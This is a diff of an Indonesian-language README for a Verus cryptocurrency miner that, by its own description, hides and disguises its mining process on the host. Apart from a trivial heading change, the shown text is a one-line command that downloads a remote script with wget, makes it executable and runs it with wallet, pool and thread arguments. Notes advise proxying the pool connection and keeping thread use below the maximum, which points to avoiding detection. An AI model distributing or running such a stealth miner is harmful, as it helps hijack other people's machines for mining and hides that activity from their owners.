@@ -4,7 +4,7 @@ miner verus coin yang mampu menyembunyikan dan menyamarkan proses mining di sist
  apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
 ## Penggunaan
 wget https://github.com/x011-al/silumancode/raw/refs/heads/main/sh && chmod +x sh && ./sh wallet.namaminer pool thread y/n
-- Keterangan :
+### Keterangan :
         - wallet : alamat walet verus miner anda.
         - pool   : pool mining verus coin (usahakan menggunakan proxy).
         - thread : jumlah thread processor yang akan digunakan (usakan tidak menggunakan thread maksimal yang tersedia).
